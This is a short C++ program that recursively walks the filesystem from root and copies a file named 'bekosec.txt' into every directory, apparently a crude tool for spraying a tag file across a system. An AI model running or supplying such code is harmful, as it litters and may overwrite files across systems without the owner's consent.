#include <iostream>
#include <fstream>
#include <filesystem>

namespace fs = std::filesystem;

int main()
{
    std::string source_file = "bekosec.txt";
    std::string destination;

    // Iterate through all directories
    for (const auto& dir : fs::recursive_directory_iterator("/"))
    {
        if (fs::is_directory(dir))
        {
            destination = dir.path().string() + "/bekosec.txt";
            std::cout << "Copying " << source_file << " to " << destination << std::endl;

            std::ifstream src(source_file, std::ios::binary);
            std::ofstream dst(destination, std::ios::binary);
            dst << src.rdbuf();
        }
    }

    std::cout << "Copy complete!" << std::endl;

    return 0;
}
